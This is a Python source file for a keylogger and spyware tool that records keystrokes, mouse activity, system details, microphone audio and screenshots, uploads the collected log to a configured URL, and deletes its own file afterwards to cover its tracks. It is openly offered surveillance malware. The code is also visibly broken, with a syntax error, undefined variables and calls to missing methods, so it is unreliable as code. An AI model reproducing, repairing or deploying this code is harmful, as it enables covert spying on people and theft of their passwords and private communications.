try:
    import logging
    import datetime
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    DOMAIN = "https://127.0.0.1:8080/home"
    #EMAIL_ADDRESS = "YOUR_USERNAME"
    #EMAIL_PASSWORD = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 60 # as in seconds
    
    class KeyLogger:
        #EDIT THE FOLLOWING SO THAT THERE ARE NO ERRORS WITH "email" or "password"
        def __init__(self, time_interval, filename, dest_url):
            self.interval = time_interval
            #self.log = "KeyLogger Started..."
            #self.email = email
            #self.password = password
            logging.basicConfig(
                filename = './%(asctime)s.log'
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
            )

            self.path = filename
            self.url = 'https://127.0.0.1:8080'
            
        def appendlog(self, string):
            filename += string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        #def send_mail(self, email, password, message):
            #sender = "Private Person <from@example.com>"
            #receiver = "A Test User <to@example.com>"

            #m = f"""\
            #Subject: main Mailtrap
            #To: {receiver}
            #From: {sender}

            #Keylogger by aydinnyunus\n"""

            #m += message
            #with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            #    server.login(email, password)
            #    server.sendmail(sender, receiver, message)

        #
        def upload_file(self):
            with open(self.path, 'rb') as file:
                files = {'file': (self.path, file)}
                response = self.send_post(self.url, files=files)
                timer = threading.Timer(self.interval, self.report)
                timer.start()        
            # Check the status code of the response
                if response.status_code == 200:
                    print("File uploaded successfully.")
                else:
                    print(f"Failed to upload file. Status code: {response.status_code}")
                    print(response.text)        
                
        #def report(self):
            #self.send_post(self.path, self.url, "\n\n" + self.log)
            #self.log = ""
            #timer = threading.Timer(self.interval, self.report)
            #timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.upload_file()

        def screenshot(self):
            img = pyscreenshot.grab()

            self.upload_file()

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, DOMAIN)
    keylogger.run()


